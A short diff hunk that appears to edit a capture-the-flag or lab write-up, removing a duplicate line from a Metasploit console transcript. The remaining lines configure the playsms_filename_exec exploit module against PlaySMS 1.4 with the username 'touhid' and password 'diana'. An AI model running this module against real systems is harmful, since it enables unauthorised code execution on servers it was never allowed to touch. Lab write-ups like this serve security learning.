@@ -230,8 +230,6 @@ Exploit target:
    0   PlaySMS 1.4
 
 
-msf5 exploit(multi/http/playsms_filename_exec) > set password touhid
-password => touhid
 msf5 exploit(multi/http/playsms_filename_exec) > set password diana
 password => diana
 msf5 exploit(multi/http/playsms_filename_exec) > set username touhid
